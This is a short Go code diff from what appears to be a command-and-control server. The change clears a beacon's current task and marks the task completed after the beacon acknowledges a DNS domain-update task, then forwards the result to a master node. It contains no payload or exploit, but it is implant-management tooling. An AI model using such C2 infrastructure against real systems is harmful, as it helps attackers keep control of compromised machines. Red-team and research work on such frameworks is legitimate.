@@ -1073,7 +1073,34 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 		if !isDuplicate {
 			logf("[C2] Domain update acknowledged by beacon %s (task %s)", beaconID, taskID)
 		}
-		// Just acknowledge receipt, don't try to save to DB
+
+		// CRITICAL: Clear the beacon's current task immediately
+		// This prevents the DNS server from re-sending the update_domains task
+		// when the beacon checks in again
+		c2.mutex.Lock()
+		if beacon, beaconExists := c2.beacons[beaconID]; beaconExists {
+			if beacon.CurrentTask == taskID {
+				beacon.CurrentTask = ""
+				if c2.debug {
+					logf("[DEBUG] Cleared current task for beacon %s after domains_updated", beaconID)
+				}
+			}
+		}
+
+		// Also mark the task as completed in local database if it exists
+		if task, exists := c2.tasks[taskID]; exists {
+			task.Status = "completed"
+			task.Result = result
+			if c2.db != nil {
+				go func(tid string) {
+					if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
+						logf("[C2] Failed to update domains_updated task status: %v", err)
+					}
+				}(taskID)
+			}
+		}
+		c2.mutex.Unlock()
+
 		// Forward to Master if in distributed mode
 		if masterClient != nil {
 			go func(tid, bid, res string) {
